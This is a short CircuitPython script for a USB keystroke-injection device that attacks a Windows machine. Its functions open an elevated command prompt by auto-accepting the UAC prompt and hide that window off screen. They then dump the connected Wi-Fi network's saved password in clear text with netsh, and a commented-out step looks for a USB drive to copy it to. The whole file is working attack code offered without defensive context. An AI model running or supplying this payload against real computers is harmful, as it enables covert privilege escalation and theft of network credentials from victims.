import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

def bypassUAC():
    print("bypassing UAC")
    keyboard.send(Keycode.GUI, Keycode.R)
    time.sleep(0.40)
    keyboard_layout.write("powershell Start-Process cmd -Verb runAs")
    time.sleep(0.6)
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    keyboard.send(Keycode.ALT, Keycode.Y)

def hide():
    # Shrinking cmd window
    keyboard_layout.write("mode con cols=15 lines=1")
    keyboard.send(Keycode.ENTER)

    # moving cmd window off screen
    keyboard.send(Keycode.ALT, Keycode.SPACEBAR)
    time.sleep(0.3)
    keyboard.send(Keycode.M)
    time.sleep(0.3)

    delay = time.monotonic() + 6
    now = time.monotonic()
    print(delay)
    print(now)
    while delay > now:
        keyboard.send(Keycode.LEFT_ARROW)
        now = time.monotonic()

    # pressing enter leaves the movement window
    keyboard.send(Keycode.ENTER)
    print("done moving")

def pullASneaky():
    keyboard_layout.write("cd %USERPROFILE%\Documents")
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    # finding usb named SERVICE
    #keyboard_layout.write("for /f \"tokens=3 delims= \" %D in ('echo list volume ^| diskpart ^| findstr SERVICE') do (set DRIVE=%D)")
    #keyboard.send(Keycode.ENTER)

    # set envvar to SSID name
    keyboard_layout.write("for /f \"tokens=2 delims=: \" %I in ('netsh wlan show interface ^| findstr SSID ^| findstr /v BSSID') do set I=%I")
    keyboard.send(Keycode.ENTER)

    # get info from network
    time.sleep(0.1)
    keyboard_layout.write("netsh wlan show profile %I% key=clear")
    keyboard.send(Keycode.ENTER)

    time.sleep(4)

    keyboard_layout.write("exit")
    keyboard.send(Keycode.ENTER)
